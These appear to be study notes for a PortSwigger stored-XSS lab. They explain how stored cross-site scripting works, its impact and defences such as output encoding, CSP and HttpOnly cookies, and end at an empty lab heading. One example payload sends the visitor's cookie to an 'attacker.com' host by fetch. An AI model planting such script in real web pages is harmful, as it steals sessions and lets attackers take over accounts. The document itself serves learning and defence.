---
Category: XSS
LAB: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
Difficulty: Apprentice
---

---
A **stored XSS (Cross-Site Scripting)** vulnerability occurs when an attacker injects malicious JavaScript into a web application's **server-side storage** (such as a database). The payload is then served to other users whenever they view the affected page.

### How it works

1. The attacker submits input containing JavaScript (e.g., in a comment, profile, or forum post).
2. The application stores the input without properly sanitizing or encoding it.
3. Another user visits the page containing the stored input.
4. The victim's browser executes the attacker's JavaScript as if it were part of the legitimate website.

### Example

Attacker posts a comment:

```
<script>alert(document.cookie)</script>
```

If the application stores it as-is, every visitor to the comments page will execute:

```
alert(document.cookie);
```

In a real attack, the payload is usually more malicious, for example:

```
<script>fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));</script>
```

### Impact

- Steal session cookies (if they are not `HttpOnly`)
- Take over user accounts
- Perform actions as the victim
- Deface pages
- Deliver malware or phishing content

### Prevention

- **Escape/encode output** based on the HTML context.
- **Sanitize user input** when appropriate.
- Use **Content Security Policy (CSP)**.
- Mark sensitive cookies as **`HttpOnly`** and **`Secure`**.
- Validate and filter input on both the client and server side.

**Key idea:** In **stored XSS**, the malicious payload is **saved on the server** and executed whenever users load the affected page, making it generally more dangerous than reflected XSS because victims don't need to click a specially crafted link.

---
# Lab

